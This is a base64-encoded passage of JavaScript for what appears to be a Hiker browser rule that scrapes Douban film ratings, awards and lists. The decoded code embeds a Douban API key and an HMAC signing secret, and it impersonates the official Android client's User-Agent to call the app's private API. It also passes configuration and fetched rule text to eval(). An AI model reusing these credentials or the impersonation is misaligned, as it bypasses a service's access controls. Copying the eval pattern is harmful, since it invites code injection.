GxlY3Rpb25cXFxcXFxcIiB8fCB0eXBlID09IFxcXFxcXFwiY2hhcnRcXFxcXFxcIikge1xcXFxyXFxcXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgc3ViamVjdENvbGxlY3Rpb25MaXN0KE1ZX1BBR0UsIDUwLCBpZCk7XFxcXHJcXFxcbiAgICAgICAgICAgICAgICAgICAgICAgIH1cXFxcclxcXFxuICAgICAgICAgICAgICAgICAgICB9LCBkYXRhLnRhcmdldF90eXBlLCBlLmlkKSxcXFxcclxcXFxuICAgICAgICAgICAgICAgIGltZzogZS5jb3Zlcl91cmwgKyBcXFxcXFxcIkBSZWZlcmVyPVxcXFxcXFwiICsgZS5jb3Zlcl91cmxcXFxcclxcXFxuICAgICAgICAgICAgfSlcXFxcclxcXFxuICAgICAgICB9IGVsc2Uge1xcXFxyXFxcXG4gICAgICAgICAgICBsZXQgdHlwZSA9IGRhdGEudGFyZ2V0X3R5cGUsXFxcXHJcXFxcbiAgICAgICAgICAgICAgICBpZCA9IGRhdGEudGFyZ2V0LmlkLFxcXFxyXFxcXG4gICAgICAgICAgICAgICAgdGl0bGUgPSBkYXRhLnRhcmdldC50aXRsZTtcXFxcclxcXFxuICAgICAgICAgICAgbGV0IHVzZUNvbmZpZyA9IGRldGFpbHNWaWV3Q29uZmlnc1tkZXRhaWxzVmlld0NvbmZpZ3MudXNlXS5jb25maWc7XFxcXHJcXFxcbiAgICAgICAgICAgIGxldCB1cmxQYXJhbXMgPSB7fTtcXFxcclxcXFxuICAgICAgICAgICAgaWYgKHVzZUNvbmZpZy5zdGFydHNXaXRoKCd7JykpIHtcXFxcclxcXFxuICAgICAgICAgICAgICAgIGV2YWwoJ3VybFBhcmFtcyA9ICcgKyB1c2VDb25maWcpO1xcXFxyXFxcXG4gICAgICAgICAgICB9IGVsc2Uge1xcXFxyXFxcXG4gICAgICAgICAgICAgICAgdXJsUGFyYW1zLnVybCA9ICQoXFxcXFxcXCJoaWtlcjovL2VtcHR5I25vSGlzdG9yeSMjaW1tZXJzaXZlVGhlbWUjXFxcXFxcXCIgKyAnP3R5cGU9JyArIHR5cGUgKyAnJmlkPScgKyBpZClcXFxcclxcXFxuICAgICAgICAgICAgICAgICAgICAucnVsZSgodHlwZSwgaWQsIHRpdGxlLCB1c2VDb25maWcpID0+IHtcXFxcclxcXFxuICAgICAgICAgICAgICAgICAgICAgICAgZXZhbChKU09OLnBhcnNlKHJlcXVlc3QoJ2hpa2VyOi8vcGFnZS9tYWluJykpLnJ1bGUpO1xcXFxyXFxcXG4gICAgICAgICAgICAgICAgICAgICAgICBpZiAodHlwZSA9PT0gXFxcXFxcXCJwbGF5bGlzdFxcXFxcXFwiKSB7XFxcXHJcXFxcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICBkb3VMaXN0KGlkLCBNWV9QQUdFLCA1MCk7XFxcXHJcXFxcbiAgICAgICAgICAgICAgICAgICAgICAgIH0gZWxzZSB7XFxcXHJcXFxcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICBldmFsKHVzZUNvbmZpZyk7XFxcXHJcXFxcbiAgICAgICAgICAgICAgICAgICAgICAgIH1cXFxcclxcXFxuICAgICAgICAgICAgICAgICAgICB9LCB0eXBlLCBpZCwgdGl0bGUsIHVzZUNvbmZpZyk7XFxcXHJcXFxcbiAgICAgICAgICAgIH1cXFxcclxcXFxuICAgICAgICAgICAgaXRlbXMucHVzaCh7XFxcXHJcXFxcbiAgICAgICAgICAgICAgICB0aXRsZTogdGl0bGUsXFxcXHJcXFxcbiAgICAgICAgICAgICAgICBpbWc6IGRhdGEudGFyZ2V0LmNvdmVyX3VybCArIFxcXFxcXFwiQFJlZmVyZXI9XFxcXFxcXCIgKyBkYXRhLnRhcmdldC5jb3Zlcl91cmwsXFxcXHJcXFxcbiAgICAgICAgICAgICAgICBkZXNjOiBkYXRhLnR5cGVfbmFtZSxcXFxcclxcXFxuICAgICAgICAgICAgICAgIGNvbnRlbnQ6IGRhdGEudGFyZ2V0LmNhcmRfc3VidGl0bGUsXFxcXHJcXFxcbiAgICAgICAgICAgICAgICB1cmw6IHVybFBhcmFtcy51cmwsXFxcXHJcXFxcbiAgICAgICAgICAgICAgICBleHRyYTogdXJsUGFyYW1zLmV4dHJhXFxcXHJcXFxcbiAgICAgICAgICAgIH0pO1xcXFxyXFxcXG4gICAgICAgIH1cXFxcclxcXFxuXFxcXHJcXFxcbiAgICB9KTtcXFxcclxcXFxuXFxcXHJcXFxcbiAgICBzZXRTZWFyY2hSZXN1bHQoe1xcXFxyXFxcXG4gICAgICAgIGRhdGE6IGl0ZW1zXFxcXHJcXFxcbiAgICB9KTtcXFxcclxcXFxufVxcXFxyXFxcXG5cXFxcclxcXFxuLy/kuoznuqfpobXpnaJcXFxcclxcXFxuZnVuY3Rpb24gZXJqaSgpIHtcXFxcclxcXFxuICAgIGFkZExpc3RlbmVyKFxcXFxcXFwib25DbG9zZVxcXFxcXFwiLCAkLnRvU3RyaW5nKCgpID0+IHtcXFxcclxcXFxuICAgICAgICBjbGVhck15VmFyKFxcXFxcXFwiZmluZExpc3RcXFxcXFxcIik7XFxcXHJcXFxcbiAgICAgICAgY2xlYXJNeVZhcihcXFxcXFxcImhvdExpc3RcXFxcXFxcIik7XFxcXHJcXFxcbiAgICAgICAgY2xlYXJNeVZhcihcXFxcXFxcImNsYXNzbGlzdFxcXFxcXFwiKTtcXFxcclxcXFxuICAgICAgICBjbGVhck15VmFyKFxcXFxcXFwicGxheWxpc3RcXFxcXFxcIik7XFxcXHJcXFxcbiAgICAgICAgY2xlYXJNeVZhcihcXFxcXFxcInJhbmtMaXN0XFxcXFxcXCIpO1xcXFxyXFxcXG4gICAgICAgIGNsZWFyTXlWYXIoXFxcXFxcXCJyYW5raW5nXFxcXFxcXCIpO1xcXFxyXFxcXG4gICAgICAgIGNsZWFyTXlWYXIoXFxcXFxcXCJjb21pbmdcXFxcXFxcIik7XFxcXHJcXFxcbiAgICAgICAgY2xlYXJNeVZhcihcXFxcXFxcImFuYWx5c2lzXFxcXFxcXCIpO1xcXFxyXFxcXG4gICAgfSkpXFxcXHJcXFxcblxcXFxyXFxcXG4gICAgbGV0IGNob2ljZSA9IE1ZX1VSTC5zcGxpdCgnLyMvJylbMV0uc3BsaXQoJyMnKVswXTtcXFxcclxcXFxuICAgIGxldCBkID0gW107XFxcXHJcXFxcbiAgICBzd2l0Y2ggKGNob2ljZSkge1xcXFxyXFxcXG4gICAgICAgIGNhc2UgXFxcXFxcXCLmjqjojZBcXFxcXFxcIjpcXFxcclxcXFxuICAgICAgICAgICAgZXZhbChKU09OLnBhcnNlKHJlcXVlc3QoJ2hpa2VyOi8vcGFnZS9tYWluJykpLnJ1bGUpO1xcXFxyXFxcXG4gICAgICAgICAgICBkID0gZmluZExpc3QoTVlfUEFHRSwgMTApO1xcXFxyXFxcXG4gICAgICAgICAgICBicmVhaztcXFxcclxcXFxuICAgICAgICBjYXNlIFxcXFxcXFwi54Ot6ZeoXFxcXFxcXCI6XFxcXHJcXFxcbiAgICAgICAgICAgIGV2YWwoSlNPTi5wYXJzZShyZXF1ZXN0KCdoaWtlcjovL3BhZ2UvbWFpbicpKS5ydWxlKTtcXFxcclxcXFxuICAgICAgICAgICAgZCA9IGhvdExpc3QoTVlfUEFHRSwgMTApO1xcXFxyXFxcXG4gICAgICAgICAgICBicmVhaztcXFxcclxcXFxuICAgICAgICBjYXNlIFxcXFxcXFwi5YiG57G7XFxcXFxcXCI6XFxcXHJcXFxcbiAgICAgICAgICAgIGV2YWwoSlNPTi5wYXJzZShyZXF1ZXN0KCdoaWtlcjovL3BhZ2UvbWFpbicpKS5ydWxlKTtcXFxcclxcXFxuICAgICAgICAgICAgZCA9IGNsYXNzTGlzdChNWV9QQUdFLCAxNSk7XFxcXHJcXFxcbiAgICAgICAgICAgIGJyZWFrO1xcXFxyXFxcXG4gICAgICAgIGNhc2UgXFxcXFxcXCLniYfljZVcXFxcXFxcIjpcXFxcclxcXFxuICAgICAgICAgICAgZXZhbChKU09OLnBhcnNlKHJlcXVlc3QoJ2hpa2VyOi8vcGFnZS9tYWluJykpLnJ1bGUpO1xcXFxyXFxcXG4gICAgICAgICAgICBkID0gcGxheUxpc3QoTVlfUEFHRSwgMTApO1xcXFxyXFxcXG4gICAgICAgICAgICBicmVhaztcXFxcclxcXFxuICAgICAgICBjYXNlIFxcXFxcXFwi5qac5Y2VXFxcXFxcXCI6XFxcXHJcXFxcbiAgICAgICAgICAgIGV2YWwoSlNPTi5wYXJzZShyZXF1ZXN0KCdoaWtlcjovL3BhZ2UvbWFpbicpKS5ydWxlKTtcXFxcclxcXFxuICAgICAgICAgICAgZCA9IHJhbmtMaXN0KE1ZX1BBR0UsIDEwKTtcXFxcclxcXFxuICAgICAgICAgICAgYnJlYWs7XFxcXHJcXFxcbiAgICAgICAgY2FzZSBcXFxcXFxcIuWwhuS4iuaYoFxcXFxcXFwiOlxcXFxyXFxcXG4gICAgICAgICAgICBldmFsKEpTT04ucGFyc2UocmVxdWVzdCgnaGlrZXI6Ly9wYWdlL21haW4nKSkucnVsZSk7XFxcXHJcXFxcbiAgICAgICAgICAgIGQgPSBjb21pbmdMaXN0KE1ZX1BBR0UsIDEwKTtcXFxcclxcXFxuICAgICAgICAgICAgYnJlYWs7XFxcXHJcXFxcbiAgICB9XFxcXHJcXFxcbiAgICBzZXRSZXN1bHQoZCk7XFxcXHJcXFxcbn1cXFxcclxcXFxuXFxcXHJcXFxcbi8v6I635Y+W6LGG55Oj6LWE5rqQLOi/lOWbnmpzb27mlbDmja5cXFxcclxcXFxuZnVuY3Rpb24gZ2V0RG91YmFuUmVzKHVybCkge1xcXFxuICAgIC8vbG9nKHVybClcXFxcclxcXFxuICAgIHZhciBjYyA9bnVsbDtcXFxcclxcXFxuICAgIGlmKCQudHlwZSh1cmwpPT0nb2JqZWN0Jyl7XFxcXHJcXFxcbiAgICAgICAgIGNjPXVybC5jYztcXFxcclxcXFxuICAgICAgICAgdXJsID0gdXJsLnVybDtcXFxcclxcXFxuICAgIH1cXFxcclxcXFxuICAgIHZhciBfdXJsID0gdXJsO1xcXFxyXFxcXG4gICAgaWYgKHVybC5pbmRleE9mKCdhcGlrZXknKSA9PT0gLTEpIHtcXFxcclxcXFxuICAgICAgICBfdXJsICs9ICh1cmwuaW5kZXhPZignPycpID09PSAtMSA/ICc/JyA6ICcmJykgKyBcXFxcXFxcImFwaWtleT0wZGFkNTUxZWMwZjg0ZWQwMjkwN2ZmNWM0MmU4ZWM3MFxcXFxcXFwiXFxcXHJcXFxcbiAgICB9XFxcXHJcXFxcbiAgICBsZXQgX3RzID0gcGFyc2VJbnQoRGF0ZS5ub3coKS8xMDAwKS50b1N0cmluZygpO1xcXFxyXFxcXG4gICAgbGV0IG0gPSAnR0VUJicgKyBlbmNvZGVVUklDb21wb25lbnQodXJsLnNwbGl0KCdkb3ViYW4uY29tJylbMV0uc3BsaXQoJz8nKVswXSkgKyAnJicgKyBfdHM7XFxcXHJcXFxcbiAgICBldmFsKGdldENyeXB0b0pTKCkpO1xcXFxyXFxcXG4gICAgbGV0IF9zaWcgPSBoZXhUb0Jhc2U2NChDcnlwdG9KUy5IbWFjU0hBMShtLCdiZjdkZGRjN2M5Y2ZlNmY3JykudG9TdHJpbmcoKSk7XFxcXHJcXFxcbiAgICBfdXJsICs9ICcmX3NpZz0nICsgX3NpZyArJyZfdHM9JyArIF90cztcXFxcclxcXFxuICAgIC8vbGV0IGNvb2tpZUNhY2hlID0gJ2hpa2VyOi8vZmlsZXMvY2FjaGUvZG91YmFuY29va2llLnR4dCc7XFxcXHJcXFxcbiAgICBsZXQgcyA9IGZldGNoKF91cmwsIHtcXFxcclxcXFxuICAgICAgICBoZWFkZXJzOiB7XFxcXHJcXFxcbiAgICAgICAgICAgIC8vJ0Nvb2tpZSc6IGZldGNoKGNvb2tpZUNhY2hlKSxcXFxcclxcXFxuICAgICAgICAgICAgXFxcXFxcXCJVc2VyLUFnZW50XFxcXFxcXCI6IFxcXFxcXFwiUmV4eGFyLUNvcmUvMC4xLjMgYXBpLWNsaWVudC8xIGNvbS5kb3ViYW4uZnJvZG8vNy45LjAuYmV0YTIoMjE1KSBBbmRyb2lkLzI1IHByb2R1Y3QvVEFTLUFMMDAgdmVuZG9yL0hVQVdFSSBtb2RlbC9UQVMtQUwwMCAgcm9tL2FuZHJvaWQgIG5ldHdvcmsvd2lmaSAgcGxhdGZvcm0vbW9iaWxlIGNvbS5kb3ViYW4uZnJvZG8vNy45LjAuYmV0YTIoMjE1KSBSZXh4YXIvMS4yLjE1MSAgcGxhdGZvcm0vbW9iaWxlIDEuMi4xNTFcXFxcXFxcIlxcXFxyXFxcXG4gICAgICAgIH0sXFxcXHJcXFxcbiAgICAgICAgbWV0aG9kOiAnR0VUJ1xcXFxyXFxcXG4gICAgICAgIC8vYm9keTogJ2hvc3Q9ZnJvZG8uZG91YmFuLmNvbSdcXFxcclxcXFxuICAgIH0pO1xcXFxyXFxcXG4gICAgbGV0IGpzb24gPSBKU09OLnBhcnNlKHMpO1xcXFxyXFxcXG4gICAgaWYoanNvbi5sb2NhbGl6ZWRfbWVzc2FnZSl7XFxcXHJcXFxcbiAgICAgICAgY2M9IGNjPT1udWxsID8gMSA6IGNjKzE7XFxcXHJcXFxcbiAgICAgICAgbG9nKCfph43or5XmrKHmlbA6JytjYyk7XFxcXHJcXFxcbiAgICAgICAgaWYoY2M+NSl7dGhyb3cgbmV3IEVycm9yKCfotoXml7YnKX1cXFxcclxcXFxuICAgICAgICBqYXZhLmxhbmcuVGhyZWFkLnNsZWVwKDEwMDApO1xcXFxyXFxcXG4gICAgICAgIHJldHVybiBnZXREb3ViYW5SZXMoe3VybDp1cmwsY2M6Y2N9KTtcXFxcclxcXFxuICAgIH1lbHNle1xcXFxyXFxcXG4gICAgICAgIHJldHVybiBqc29uO1xcXFxyXFxcXG4gICAgfVxcXFxyXFxcXG59XFxcXHJcXFxcblxcXFxyXFxcXG4vL+agueaNruivhOWIhuS/oeaBr+iOt+WPluivhOWIhuaYn+aYn+agt+W8j1xcXFxyXFxcXG5mdW5jdGlvbiBjb21wdXRlUmF0aW5nKGUsIHQpIHtcXFxcclxcXFxuICAgIGxldCBpID0gXFxcXFxcXCJcXFxcXFxcIjtcXFxcclxcXFxuICAgIGZvciAobGV0IHIgPSAwOyByIDwgNTsgcisrKSByIDwgTWF0aC5yb3VuZCh0IC8gKGUgLyA1KSkgPyBpICs9IFxcXFxcXFwi4piFXFxcXFxcXCIgOiBpICs9IFxcXFxcXFwi4piGXFxcXFxcXCI7XFxcXHJcXFxcbiAgICByZXR1cm4gaTtcXFxcclxcXFxufVxcXFxyXFxcXG5cXFxcclxcXFxuLy/or4TliIbor6bmg4XpobXpnaJcXFxcclxcXFxuZnVuY3Rpb24gcmF0aW5nKHR5cGUsIGlkLCByYXRpbmdDb3VudCkge1xcXFxyXFxcXG4gICAgc2V0UGFnZVRpdGxlKCflvbHniYfkv6Hmga8nKTtcXFxcclxcXFxuICAgIC8v6K+E5YiG57uf6K6hXFxcXHJcXFxcbiAgICBsZXQgaSA9IGdldERvdWJhblJlcyhcXFxcXFxcImh0dHBzOi8vZnJvZG8uZG91YmFuLmNvbS9hcGkvdjIvXFxcXFxcXCIgKyB0eXBlICsgXFxcXFxcXCIvXFxcXFxcXCIgKyBpZCArIFxcXFxcXFwiL3JhdGluZ1xcXFxcXFwiKTtcXFxcclxcXFxuXFxcXHJcXFxcbiAgICBsZXQgciA9IFxcXFxcXFwiPGgyPuivhOWIhue7n+iuoTwvaDI+XFxcXFxcXCI7XFxcXHJcXFxcblxcXFxyXFxcXG4gICAgciArPSAnPHNtYWxsPjxmb250IGNvbG9yPVxcXFxcXFwiZ3JleVxcXFxcXFwiPicgKyByYXRpbmdDb3VudCArICfkurror4TliIYnICsgJzwvZm9udD48L3NtYWxsPjxici8+JztcXFxcclxcXFxuXFxcXHJcXFxcbiAgICBsZXQgc3RhckNvbG9yID0gZ2V0Q29uZmlnKCdzdGFyQ29sb3InKTtcXFxcclxcXFxuICAgIGlmIChpLnN0YXRzLmxlbmd0aCA9PSAwKSB7XFxcXHJcXFxcbiAgICAgICAgaS5zdGF0cyA9IFswLCAwLCAwLCAwLCAwXTtcXFxcclxcXFxuICAgIH1cXFxcclxcXFxuICAgIGkuc3RhdHMucmV2ZXJzZSgpLmZvckVhY2goKCh2YWx1ZSwgaW5kZXgpID0+IHtcXFxcclxcXFxuICAgICAgICByICs9ICc8Zm9udCBjb2xvcj0nICsgc3RhckNvbG9yICsgJz4nICsgW1xcXFxcXFwi4piF4piF4piF4piF4piFXFxcXFxcXCIsIFxcXFxcXFwi4piF4piF4piF4piF4piGXFxcXFxcXCIsIFxcXFxcXFwi4piF4piF4piF4piG4piGXFxcXFxcXCIsIFxcXFxcXFwi4piF4piF4piG4piG4piGXFxcXFxcXCIsIFxcXFxcXFwi4piF4piG4piG4piG4piGXFxcXFxcXCJdW2luZGV4XSArIFxcXFxcXFwiPC9mb250PiZuYnNwO1xcXFxcXFwiO1xcXFxyXFxcXG5cXFxcclxcXFxuICAgICAgICByICs9IGZ1bmN0aW9uKGUpIHtcXFxcclxcXFxuICAgICAgICAgICAgbGV0IHQxID0gJyc7XFxcXHJcXFxcbiAgICAgICAgICAgIGZvciAobGV0IGkgPSAwOyBpIDwgZTsgaSsrKSB0MSArPSBcXFxcXFxcIuKWh1xcXFxcXFwiO1xcXFxyXFxcXG4gICAgICAgICAgICBsZXQgdDIgPSAnJztcXFxcclxcXFxuICAgICAgICAgICAgZm9yIChsZXQgaSA9IDA7IGkgPCAxMCAtIGU7IGkrKykgdDIgKz0gXFxcXFxcXCLilodcXFxcXFxcIjtcXFxcclxcXFxuICAgICAgICAgICAgcmV0dXJuIHQxLmZvbnRjb2xvcignI2ZmYWMyZCcpICsgdDIuZm9udGNvbG9yKCcjZTVlMWU0Jyk7XFxcXHJcXFxcbiAgICAgICAgfSgoMTAgKiB2YWx1ZSkudG9GaXhlZCgwKSk7XFxcXHJcXFxcblxcXFxyXFxcXG4gICAgICAgIHIgKz0gJyZuYnNwOzxzbWFsbD48Zm9udCBjb2xvcj1cXFxcXFxcImdyZXlcXFxcXFxcIj4nICsgKDEwMCAqIHZhbHVlKVxcXFxyXFxcXG4gICAgICAgICAgICAudG9GaXhlZCgxKSArIFxcXFxcXFwiJTwvZm9udD48L3NtYWxsPjxici8+XFxcXFxcXCI7XFxcXHJcXFxcbiAgICB9KSk7XFxcXHJcXFxcblxcXFxyXFxcXG4gICAgciArPSBbaS5kb25lX2NvdW50ID8gaS5kb25lX2NvdW50ICsgXFxcXFxcXCLkurrnnIvov4dcXFxcXFxcIiA6IFxcXFxcXFwiXFxcXFxcXCIsIGkuZG9pbmdfY291bnQgPyBpLmRvaW5nX2NvdW50ICsgXFxcXFxcXCLkurrlnKjnnItcXFxcXFxcIiA6IFxcXFxcXFwiXFxcXFxcXCIsIGkud2lzaF9jb3VudCA/IGkud2lzaF9jb3VudCArIFxcXFxcXFwi5Lq65oOz55yLXFxcXFxcXCIgOiBcXFxcXFxcIlxcXFxcXFwiXS5qb2luKFxcXFxcXFwiJm5ic3A7Jm5ic3A7XFxcXFxcXCIpXFxcXHJcXFxcbiAgICAgICAgLnNtYWxsKClcXFxcclxcXFxuICAgICAgICAuZm9udGNvbG9yKCdncmV5Jyk7XFxcXHJcXFxcbiAgICAvL+W9seeJh+S/oeaBr1xcXFxyXFxcXG4gICAgaSA9IGdldERvdWJhblJlcyhcXFxcXFxcImh0dHBzOi8vZnJvZG8uZG91YmFuLmNvbS9hcGkvdjIvXFxcXFxcXCIgKyB0eXBlICsgXFxcXFxcXCIvXFxcXFxcXCIgKyBpZCArIFxcXFxcXFwiL2Rlc2NcXFxcXFxcIik7XFxcXHJcXFxcbiAgICBsZXQgbCA9IGkuaHRtbC5yZXBsYWNlKC9bXFxcXFxcXFxuXFxcXFxcXFx0XFxcXFxcXFxyXS9nLCBcXFxcXFxcIlxcXFxcXFwiKVxcXFxyXFxcXG4gICAgICAgIC5yZXBsYWNlKC88dGRcXFxcXFxcXHMqW14+XSo+KC4qPyk8XFxcXFxcXFwvdGQ+L2csIFxcXFxcXFwiPHNwYW4+JDE8L3NwYW4+XFxcXFxcXCIpXFxcXHJcXFxcbiAgICAgICAgLnJlcGxhY2UoLzx0clxcXFxcXFxccypbXj5dKj4oLio/KTxcXFxcXFxcXC90cj4vZywgXFxcXFxcXCI8dGVuZz4kMTwvdGVuZz48YnIvPlxcXFxcXFwiKTtcXFxcclxcXFxuICAgIHBhcnNlRG9tRm9yQXJyYXkobCwgXFxcXFxcXCJzZWN0aW9uJiZ0ZW5nXFxcXFxcXCIpLmZvckVhY2goKGUgPT4ge1xcXFxyXFxcXG4gICAgICAgIGxldCB0ID0gcGFyc2VEb21Gb3JBcnJheShlLCBcXFxcXFxcInNwYW5cXFxcXFxcIik7XFxcXHJcXFxcbiAgICAgICAgbCA9IGwucmVwbGFjZSh0WzBdLCAnPGZvbnQgY29sb3I9XFxcXFxcXCJncmV5XFxcXFxcXCI+JyArIHRbMF0ucmVwbGFjZSgvPHNwYW5cXFxcXFxcXHMqW14+XSo+KC4qPyk8XFxcXFxcXFwvc3Bhbj4vZywgXFxcXFxcXCIkMVxcXFxcXFwiKSArIFxcXFxcXFwi77yaPC9mb250PlxcXFxcXFwiKVxcXFxyXFxcXG4gICAgfSkpO1xcXFxyXFxcXG4gICAgciArPSBsO1xcXFxyXFxcXG4gICAgLy/ojrflpZborrDlvZVcXFxcclxcXFxuICAgIGxldCBwYWdlID0gTVlfUEFHRTtcXFxcclxcXFxuICAgIGxldCBzID0gZ2V0RG91YmFuUmVzKFxcXFxcXFwiaHR0cHM6Ly9mcm9kby5kb3ViYW4uY29tL2FwaS92Mi9cXFxcXFxcIiArIHR5cGUgKyBcXFxcXFxcIi9cXFxcXFxcIiArIGlkICsgXFxcXFxcXCIvYXdhcmRzP3N0YXJ0PVxcXFxcXFwiICsgMjAgKiAocGFnZSAtIDEpICsgXFxcXFxcXCImY291bnQ9MjBcXFxcXFxcIik7XFxcXHJcXFxcbiAgICByICs9IFxcXFxcXFwiPGgyPuiOt+WlluiusOW9lVxcXFxcXFwiICsgJzxzbWFsbD48Zm9udCBjb2xvcj1cXFxcXFxcImdyZXlcXFxcXFxcIj4nICsgKHMudG90YWwgIT0gMCA/ICco5YWxJyArIHMudG90YWwgKyAn6aG5KScgOiAnKOaaguaXoCknKSArICc8L2ZvbnQ+PC9zbWFsbD4nICsgXFxcXFxcXCI8L2gyPlxcXFxcXFwiO1xcXFxyXFxcXG4gICAgLy9yICs9ICc8Zm9udCBjb2xvcj1cXFxcXFxcImdyZXlcXFxcXFxcIj4nICsgKHMudG90YWwgIT0gMCA/ICflhbEnICsgcy50b3RhbCArICfpobknIDogJ+aaguaXoCcpICsgJzwvZm9udD48YnIvPic7XFxcXHJcXFxcbiAgICBsZXQgcjIgPSAnJztcXFxcclxcXFxuICAgIHMuYXdhcmRzLmZvckVhY2goZSA9PiB7XFxcXHJcXFxcbiAgICAgICAgcjIgKz0gKGUuY2VyZW1vbnkudGl0bGUgKyAnKCcgKyBlLmNlcmVtb255LnllYXIgKyAnKScpLmJpZygpLmJvbGQoKSArICc8c21hbGw+KDxhIGhyZWY9XFxcXFxcXCJoaWtlcjovL2VtcHR5I25vSGlzdG9yeSNAcnVsZT1qczpldmFsKEpTT04ucGFyc2UoZmV0Y2goYGhpa2VyOi8vcGFnZS9tYWluYCkpLnJ1bGUpO2F3YXJkVmlldyhgJyArIGUuY2VyZW1vbnkuaWQgKyAnYCxgJyArIGUuY2VyZW1vbnkudGl0bGUgKyAnYCk7XFxcXFxcXCI+5p+l55yL6K+m5oOFPC9hPik8L3NtYWxsPicgKyAnPGJyLz4nO1xcXFxyXFxcXG4gICAgICAgIGUuY2F0ZWdvcmllcy5mb3JFYWNoKGl0ZW0gPT4ge1xcXFxyXFxcXG4gICAgICAgICAgICByMiArPSAoaXRlbS5jYXRlZ29yeS50aXRsZSArIChpdGVtLmlzX3dvbiA/ICcnIDogJyjmj5DlkI0pJykgKyAnJm5ic3A7JykuZm9udGNvbG9yKFxcXFxcXFwiZ3JleVxcXFxcXFwiKTtcXFxcclxcXFxuICAgICAgICAgICAgcjIgKz0gaXRlbS5jZWxlYnJpdGllcy5tYXAoY2VsZWJyaXR5ID0+IGNlbGVicml0eS5uYW1lKS5qb2luKCcmbmJzcDsvJm5ic3A7Jyk7XFxcXHJcXFxcbiAgICAgICAgICAgIHIyICs9ICc8YnIvPic7XFxcXHJcXFxcbiAgICAgICAgfSlcXFxcclxcXFxuICAgICAgICByMiArPSAnPGJyLz4nO1xcXFxyXFxcXG4gICAgfSlcXFxcclxcXFxuXFxcXHJcXFxcbiAgICBpZiAocGFnZSA9PSAxKSB7XFxcXHJcXFxcbiAgICAgICAgc2V0SG9tZVJlc3VsdCh7XFxcXHJcXFxcbiAgICAgICAgICAgIGRhdGE6IFt7XFxcXHJcXFxcbiAgICAgICAgICAgICAgICB0aXRsZTogciArIHIyLFxcXFxyXFxcXG4gICAgICAgICAgICAgICAgY29sX3R5cGU6IFxcXFxcXFwicmljaF90ZXh0XFxcXFxcXCJcXFxcclxcXFxuICAgICAgICAgICAgfV1cXFxcclxcXFxuICAgICAgICB9KVxcXFxyXFxcXG4gICAgfSBlbHNlIGlmKHMuYXdhcmRzLmxlbmd0aCA9PSAwKXtcXFxcclxcXFxuICAgICAgICBzZXRSZXN1bHQoW10pO1xcXFxyXFxcXG4gICAgfSBlbHNle1xcXFxyXFxcXG4gICAgICAgIHNldEhvbWVSZXN1bHQoe1xcXFxyXFxcXG4gICAgICAgICAgICBkYXRhOiBbe1xcXFxyXFxcXG4gICAgICAgICAgICAgICAgdGl0bGU6IHIyLFxcXFxyXFxcXG4gICAgICAgICAgICAgICAgY29sX3R5cGU6IFxcXFxcXFwicmljaF90ZXh0XFxcXFxcXCJcXFxcclxcXFxuICAgICAgICAgICAgfV1cXFxcclxcXFxuICAgICAgICB9KVxcXFxyXFxcXG4gICAgfVxcXFxyXFxcXG59XFxcXHJcXFxcblxcXFxyXFxcXG4vL+WllumhueivpuaDhemhtemdolxcXFxyXFxcXG5mdW5jdGlvbiBhd2FyZFZpZXcoaWQsIG5hbWUpIHtcXFxcclxcXFxuICAgIHNldFBhZ2VUaXRsZShuYW1lKTtcXFxcclxcXFxuICAgIGxldCBzID0gZ2V0RG91YmFuUmVzKFxcXFxcXFwiaHR0cHM6Ly9mcm9kby5kb3ViYW4uY29tL2FwaS92Mi9jZXJlbW9ueS9cXFxcXFxcIiArIGlkKTtcXFxcclxcXFxuICAgIGxldCBhID0gW107XFxcXHJcXFxcbiAgICBhLnB1c2goe1xcXFxyXFxcXG4gICAgICAgIHRpdGxlOiAn4oCc4oCc4oCd4oCdJyArIChzLnRpdGxlICsgJygnICsgcy55ZWFyICsgJyknKS5iaWcoKS5ib2xkKCksXFxcXHJcXFxcbiAgICAgICAgY29sX3R5cGU6ICd0ZXh0XzEnLFxcXFxyXFxcXG4gICAgICAgIGV4dHJhOiB7XFxcXHJcXFxcbiAgICAgICAgICAgIGxpbmVWaXNpYmxlOiBmYWxzZVxcXFxyXFxcXG4gICAgICAgIH1cXFxcclxcXFxuICAgIH0pXFxcXHJcXFxcbiAgICBzLnBsYXlsaXN0cy5mb3JFYWNoKGUgPT4ge1xcXFxyXFxcXG4gICAgICAgIGEucHVzaCh7XFxcXHJcXFxcbiAgICAgICAgICAgIHRpdGxlOiBlLnRpdGxlLFxcXFxyXFxcXG4gICAgICAgICAgICBkZXNjOiAn5YWxJyArIGUuaXRlbXNfY291bnQgKyAn6YOoJyxcXFxcclxcXFxuICAgICAgICAgICAgaW1nOiBlLmNvdmVyX3VybCArICdAUmVmZXJlcj0nICsgZS5jb3Zlcl91cmwsXFxcXHJcXFxcbiAgICAgICAgICAgIHVybDogJCgnaGlrZXI6Ly9lbXB0eSNub0hpc3RvcnkjJykucnVsZSgoaWQpID0+IHtcXFxcclxcXFxuICAgICAgICAgICAgICAgIGV2YWwoSlNPTi5wYXJzZShyZXF1ZXN0KCdoaWtlcjovL3BhZ2UvbWFpbicpKS5ydWxlKTtcXFxcclxcXFxuICAgICAgICAgICAgICAgIGRvdUxpc3QoaWQpO1xcXFxyXFxcXG4gICAgICAgICAgICB9LCBlLmlkKVxcXFxyXFxcXG4gICAgICAgIH0pXFxcXHJcXFxcbiAgICB9KVxcXFxyXFxcXG5cXFxcclxcXFxuICAgIGxldCByID0gJyc7XFxcXHJcXFxcbiAgICBzLnByaXplcy5mb3JFYWNoKGUgPT4ge1xcXFxyXFxcXG4gICAgICAgIHIgKz0gJzxoND7ojrflpZblkI3ljZUoJyArIGUudGl0bGUgKyAnKTwvaDQ+JztcXFxcclxcXFxuICAgICAgICBlLmNhdGVnb3JpZXMuZm9yRWFjaCh0ID0+IHtcXFxcclxcXFxuICAgICAgICAgICAgciArPSAodC50aXRsZSArICcmbmJzcDsmbmJzcDsmbmJzcDsmbmJzcDsnKS5mb250Y29sb3IoXFxcXFxcXCJncmV5XFxcXFxcXCIpLmJvbGQoKTtcXFxcclxcXFxuICAgICAgICAgICAgciArPSB0LnJlc3VsdHMubWFwKGl0ZW0gPT4gISFpdGVtLmluZm8gPyBpdGVtLmluZm8gKyAoJyZuYnNwOy0mbmJzcDsnICsgaXRlbS50aXRsZSArICcmbmJzcDsmbmJzcDsnKS5mb250Y29sb3IoXFxcXFxcXCJncmV5XFxcXFxcXCIpIDogaXRlbS50aXRsZSkuam9pbignJm5ic3A7LyZuYnNwOycpLmJvbGQoKTtcX